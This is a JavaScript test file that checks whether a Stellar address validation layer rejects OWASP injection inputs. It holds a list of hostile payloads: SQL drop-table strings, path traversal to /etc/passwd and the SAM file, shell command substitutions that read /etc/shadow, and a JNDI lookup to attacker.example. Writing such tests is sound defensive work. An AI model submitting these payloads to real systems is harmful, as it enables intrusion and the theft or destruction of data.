/**
 * OWASP A03:2021 — Injection
 *
 * Asserts that the Zod validation layer refuses hostile strings before they
 * can reach a query builder, XDR encoder, or filesystem path. These are
 * behavioural assertions against the real schemas in src/validation.js — no
 * security-specific production code was added to make them pass.
 *
 * Removing a `.regex()` / `.refine()` from stellarAddress or contractAddress
 * makes these fail deterministically.
 */
import {
  initializeSchema,
  contractAddress,
  stellarAddress,
  isValidStellarAddress,
  distributeSchema,
} from "../../src/validation.js";

const VALID_CONTRACT = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABSC4";
const VALID_WALLET = "GA7E6YDRQKJ2JNOG27UPSCQ3FQ6U4X3QQGJKHNGF23T7QCI2FM6E3W2P";

// SQL, NoSQL, command, path-traversal, template and JNDI payloads.
const INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE audit_log; --",
  "1; DELETE FROM transactions WHERE 1=1",
  "admin'--",
  "../../../../etc/passwd",
  "..\\..\\..\\windows\\system32\\config\\sam",
  "$(whoami)",
  "`id`",
  "; cat /etc/shadow",
  "{{7*7}}",
  "${jndi:ldap://attacker.example/a}",
  "\u0000GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
];

describe("Security — OWASP A03 Injection", () => {
  describe("contract address validation", () => {
    test.each(INJECTION_PAYLOADS)("rejects %j as a contractId", (payload) => {
      const result = contractAddress.safeParse(payload);
      expect(result.success).toBe(false);
    });

    test("accepts a well-formed contract address", () => {
      expect(contractAddress.safeParse(VALID_CONTRACT).success).toBe(true);
    });
  });

  describe("stellar account address validation", () => {
    test.each(INJECTION_PAYLOADS)("rejects %j as a walletAddress", (payload) => {
      expect(stellarAddress.safeParse(payload).success).toBe(false);
      expect(isValidStellarAddress(payload)).toBe(false);
    });

    test("accepts a well-formed account address", () => {
      expect(stellarAddress.safeParse(VALID_WALLET).success).toBe(true);
    });
  });

  describe("full request payloads", () => {
    test.each(INJECTION_PAYLOADS)(
      "initializeSchema rejects injected contractId %j",
      (payload) => {
        const result = initializeSchema.safeParse({
          contractId: payload,
          walletAddress: VALID_WALLET,
          collaborators: [VALID_WALLET],
          shares: [10000],
        });
        expect(result.success).toBe(false);
      }
    );

    test("initializeSchema rejects an injected collaborator entry", () => {
      const result = initializeSchema.safeParse({
        contractId: VALID_CONTRACT,
        walletAddress: VALID_WALLET,
        collaborators: [VALID_WALLET, "' OR 1=1 --"],
        shares: [5000, 5000],
      });
      expect(result.success).toBe(false);
    });

    test("distributeSchema rejects an injected contractId", () => {
      const result = distributeSchema.safeParse({
        contractId: "'; DROP TABLE transactions; --",
        walletAddress: VALID_WALLET,
      });
      expect(result.success).toBe(false);
    });
  });

  describe("type confusion cannot bypass string validation", () => {
    // A NoSQL-style operator object must not satisfy a string schema.
    test.each([
      [{ $ne: null }],
      [{ $gt: "" }],
      [["' OR 1=1 --"]],
      [42],
      [true],
      [null],
    ])("rejects non-string %j for walletAddress", (payload) => {
      expect(stellarAddress.safeParse(payload).success).toBe(false);
    });
  });
});
